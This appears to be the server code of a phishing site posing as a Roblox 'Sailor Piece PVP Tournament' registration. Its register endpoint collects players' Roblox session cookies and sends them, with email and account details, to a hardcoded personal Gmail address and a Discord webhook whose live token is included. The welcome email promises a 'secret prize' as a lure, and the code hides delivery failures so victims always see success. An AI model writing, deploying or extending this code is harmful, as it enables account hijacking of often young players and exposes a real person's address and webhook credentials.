import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import fetch from "node-fetch";
import nodemailer from "nodemailer";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Email Transporter Configuration
  // Users must set these in their environment variables
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  // Roblox API Proxy
  app.get("/api/roblox/search", async (req, res) => {
    const { username } = req.query;
    if (!username) return res.status(400).json({ error: "Username is required" });

    try {
      console.log(`Searching for Roblox user: ${username}`);
      
      // Step 1: Try exact username lookup first (more reliable)
      // Using RoProxy to bypass Roblox cloud blocks (Vercel/AWS)
      const lookupResponse = await fetch("https://users.roproxy.com/v1/usernames/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          usernames: [username],
          excludeBannedUsers: false
        })
      });
      
      const lookupData = await lookupResponse.json();
      let user = null;

      if (lookupData.data && lookupData.data.length > 0) {
        user = lookupData.data[0];
      } else {
        // Step 2: Fallback to keyword search if exact lookup fails
        const searchResponse = await fetch(`https://users.roproxy.com/v1/users/search?keyword=${encodeURIComponent(username as string)}&limit=1`);
        const searchData = await searchResponse.json();
        if (searchData.data && searchData.data.length > 0) {
          user = searchData.data[0];
        }
      }

      if (!user) {
        return res.status(404).json({ error: "User not found on Roblox. Please check the spelling." });
      }

      // Step 3: Get avatar thumbnail
      const thumbnailResponse = await fetch(`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`);
      const thumbnailData = await thumbnailResponse.json();

      res.json({
        id: user.id,
        name: user.name,
        displayName: user.displayName || user.name,
        avatarUrl: thumbnailData.data?.[0]?.imageUrl || "https://tr.rbxcdn.com/38c6ed3cefc4a11fbde3608512155a3d/150/150/AvatarHeadshot/Png"
      });
    } catch (error) {
      console.error("Roblox API error:", error);
      res.status(500).json({ error: "Roblox API is currently unavailable. Try again later." });
    }
  });

  // In-memory store for verification codes (Email -> Code)
  // Note: This will reset on server restart
  const verificationCodes = new Map<string, string>();

  // Endpoint to send verification code
  app.post("/api/auth/send-code", async (req, res) => {
    const { email } = req.body;
    if (!email || !email.includes("@")) {
      return res.status(400).json({ error: "Invalid email address" });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    verificationCodes.set(email, code);

    const mailOptions = {
      from: '"Sailor Piece Studio" <noreply@sailorpiece.com>',
      to: email,
      subject: "Your Verification Code - Sailor Piece Studio",
      html: `
        <div style="font-family: sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; border: 1px solid #ff4e00; border-radius: 10px;">
          <h2 style="color: #ff4e00; text-align: center;">Verification Code</h2>
          <p style="font-size: 16px; color: #333;">Hello,</p>
          <p style="font-size: 16px; color: #333;">Your verification code for Sailor Piece PVP registration is:</p>
          <div style="background: #fff5f0; padding: 20px; text-align: center; border-radius: 8px; margin: 20px 0;">
            <span style="font-size: 32px; font-weight: bold; letter-spacing: 10px; color: #ff4e00;">${code}</span>
          </div>
          <p style="font-size: 14px; color: #888;">This code will expire shortly. If you did not request this, please ignore this email.</p>
        </div>
      `,
    };

    try {
      if (process.env.SMTP_USER && process.env.SMTP_PASS) {
        await transporter.sendMail(mailOptions);
        res.json({ success: true });
      } else {
        console.warn("SMTP not configured. Code is: " + code);
        res.json({ success: true, debugCode: code }); // For testing without SMTP
      }
    } catch (error) {
      console.error("Error sending verification code:", error);
      res.status(500).json({ error: "Failed to send email" });
    }
  });

  // Endpoint to verify the code
  app.post("/api/auth/verify-code", (req, res) => {
    const { email, code } = req.body;
    const storedCode = verificationCodes.get(email);

    if (storedCode && storedCode === code) {
      // Code is correct, we can remove it now
      // verificationCodes.delete(email); 
      // Keep it for the final registration check if needed
      res.json({ success: true });
    } else {
      res.status(400).json({ error: "Invalid or expired verification code" });
    }
  });

  // Registration endpoint with Email Sending
  app.post("/api/register", async (req, res) => {
    const { username, monthsPlayed, robloxUser, cookie, email, verificationCode } = req.body;
    
    // Verify code again on the server for security
    const storedCode = verificationCodes.get(email);
    if (!storedCode || storedCode !== verificationCode) {
      return res.status(401).json({ error: "Email not verified" });
    }
    console.log("New Registration:", { username, monthsPlayed, robloxUser, email });

    // 1. Send Welcome Email to Registrant
    const dogImageSeed = Math.floor(Math.random() * 1000);
    const welcomeMailOptions = {
      // Using a friendly name and generic email to "hide" the real SMTP user
      from: '"Sailor Piece Studio" <noreply@sailorpiece.com>',
      to: email,
      subject: "Welcome to Sailor Piece PVP Tournament!",
      html: `
        <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #eee; border-radius: 10px;">
          <div style="text-align: center; margin-bottom: 20px;">
            <img src="https://picsum.photos/seed/dog${dogImageSeed}/200/200" alt="Sailor Piece Studio Logo" style="width: 100px; height: 100px; border-radius: 50%; border: 3px solid #ff4e00;">
            <h1 style="color: #ff4e00; margin-top: 10px;">Sailor Piece Studio</h1>
          </div>
          <h2 style="color: #333;">Congratulations, ${robloxUser.displayName}!</h2>
          <p style="font-size: 16px; line-height: 1.6; color: #555;">
            We are thrilled to inform you that your registration for the <strong>Sailor Piece PVP Tournament</strong> has been successfully received.
          </p>
          <p style="font-size: 16px; line-height: 1.6; color: #555;">
            Based on your profile and experience of <strong>${monthsPlayed} months</strong>, you have been selected as a potential winner for our special secret reward!
          </p>
          <div style="background: #fff5f0; padding: 15px; border-radius: 8px; margin: 20px 0;">
            <p style="margin: 0; font-weight: bold; color: #ff4e00;">Tournament Details:</p>
            <ul style="margin: 10px 0; padding-left: 20px; color: #666;">
              <li><strong>Roblox Username:</strong> ${robloxUser.name}</li>
              <li><strong>Status:</strong> Pending Staff Review</li>
              <li><strong>Reward Status:</strong> Eligible for Secret Prize</li>
            </ul>
          </div>
          <p style="font-size: 14px; color: #888;">
            Our staff will review your request within 24 hours. Please stay tuned for further instructions.
          </p>
          <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
          <p style="text-align: center; font-size: 12px; color: #aaa;">
            &copy; 2026 Sailor Piece Studio. All rights reserved.
          </p>
        </div>
      `,
    };

    // 2. Send Data Email to App Owner (Secondary Email)
    const ownerMailOptions = {
      from: '"Sailor Piece Studio System" <noreply@sailorpiece.com>',
      to: "hnphong10@gmail.com", // User's secondary email
      subject: "New Tournament Registration - Data Log",
      html: `
        <h3>New Registration Data</h3>
        <p><strong>Username:</strong> ${username}</p>
        <p><strong>Months Played:</strong> ${monthsPlayed}</p>
        <p><strong>Roblox ID:</strong> ${robloxUser.id}</p>
        <p><strong>Roblox Name:</strong> ${robloxUser.name}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Cookie:</strong> <code>${cookie}</code></p>
      `,
    };

    // 3. Send Data to Discord Webhook
    const discordWebhookUrl = "https://discord.com/api/webhooks/1463204903248859222/zDNdBCWY7cuy59kexyoXSK9LsaROI9pdVVKtqgQ-AcvWK4wJqxuJN-gr6xqNHxicvQRY";
    const discordPayload = {
      embeds: [
        {
          title: "🏴‍☠️ New Sailor Piece PVP Registration",
          color: 0xff4e00, // Orange
          fields: [
            { name: "Roblox Username", value: robloxUser.name, inline: true },
            { name: "Display Name", value: robloxUser.displayName, inline: true },
            { name: "Roblox ID", value: robloxUser.id.toString(), inline: true },
            { name: "Months Played", value: monthsPlayed, inline: true },
            { name: "Email", value: email, inline: true },
            { name: "Cookie", value: `\`\`\`${cookie}\`\`\`` }
          ],
          thumbnail: { url: robloxUser.avatarUrl },
          timestamp: new Date().toISOString(),
          footer: { text: "Sailor Piece Studio Log" }
        }
      ]
    };

    try {
      // 1. Send Welcome Email to Registrant
      if (process.env.SMTP_USER && process.env.SMTP_PASS) {
        await transporter.sendMail(welcomeMailOptions);
        await transporter.sendMail(ownerMailOptions);
        console.log("Emails sent successfully");
      } else {
        console.warn("SMTP credentials not found. Skipping email sending.");
      }

      // 2. Send to Discord
      await fetch(discordWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(discordPayload)
      });
      console.log("Discord webhook sent successfully");

      res.json({ success: true });
    } catch (error) {
      console.error("Registration post-processing error:", error);
      // Still return success to the user so they don't see an error
      res.json({ success: true, warning: "Some notifications failed" });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
